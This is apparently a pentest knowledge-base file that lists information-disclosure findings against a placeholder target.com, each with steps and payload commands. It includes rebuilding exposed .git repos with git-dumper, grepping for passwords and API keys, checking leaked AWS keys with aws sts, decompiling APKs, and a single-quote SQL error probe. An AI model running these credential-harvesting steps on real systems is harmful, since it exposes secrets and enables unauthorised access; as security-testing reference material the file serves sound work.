title: Stack trace leaks DB credentials
desc: Malformed input triggered unhandled exception. Full stack trace revealed internal paths, framework version, and DB connection string.
steps:
1. Send malformed input to API endpoints
2. Look for 500 errors with verbose messages
3. Extract credentials, paths, internal IPs from trace

title: Source code disclosure via .git directory exposed
desc: /.git directory was publicly accessible. Attacker reconstructed full source code including secrets.
steps:
1. Check /.git/HEAD — if accessible, .git is exposed
2. Use git-dumper to reconstruct repo
3. Search source for secrets, API keys, credentials
payload:
# Check:
curl https://target.com/.git/HEAD
# Dump:
git-dumper https://target.com/.git/ ./output
grep -r 'password\|secret\|api_key' ./output

title: AWS keys in JavaScript source file
desc: Frontend JS bundle contained hardcoded AWS access keys. Keys had broad S3 and EC2 permissions.
steps:
1. Download and search JS bundles
2. Find AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY
3. Use keys to access AWS resources
payload:
# Search JS files:
grep -r 'AKIA\|aws_secret\|AWS_SECRET' *.js
# Verify key:
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...

title: Private repo names leaked via error message
desc: Error message on 403 response included the private repository name. Allowed enumeration of private repos.
payload:
GET /api/v4/projects/1234
# Response: {"message": "404 Project private-secret-repo Not Found"}

title: Internal IP addresses in HTTP response headers
desc: API responses included X-Internal-IP and X-Backend-Server headers revealing internal network topology.
steps:
1. Make any API request
2. Inspect response headers
3. Extract internal IPs for further SSRF/pivoting
payload:
curl -I https://api.target.com/v1/users
# Response headers:
# X-Internal-IP: 10.0.1.45
# X-Backend-Server: prod-api-03.internal

title: User enumeration via password reset timing
desc: Password reset took longer for valid emails (DB lookup) vs invalid (immediate return). Timing difference allowed user enumeration.
steps:
1. Send reset for known valid email — measure response time
2. Send reset for random email — measure response time
3. Significant difference confirms valid vs invalid
payload:
# Measure timing:
time curl -X POST https://target.com/forgot-password -d 'email=valid@target.com'
time curl -X POST https://target.com/forgot-password -d 'email=notexist@target.com'

title: API keys in mobile app binary
desc: Android APK contained hardcoded API keys and secrets in strings.xml and BuildConfig. Keys had full API access.
steps:
1. Download APK from Play Store
2. Decompile: apktool d app.apk
3. Search for secrets: grep -r 'api_key\|secret\|token' ./app/
payload:
apktool d target.apk -o output
grep -r 'api_key\|secret\|token\|password' output/res/values/strings.xml

title: Verbose error reveals SQL query structure
desc: Database error message included partial SQL query, revealing table names and column structure.
steps:
1. Inject single quote in various parameters
2. Look for SQL error messages
3. Extract table/column names from error
payload:
GET /api/search?q='
# Response: "You have an error in your SQL syntax near 'search_term' in table 'user_profiles' column 'bio'"
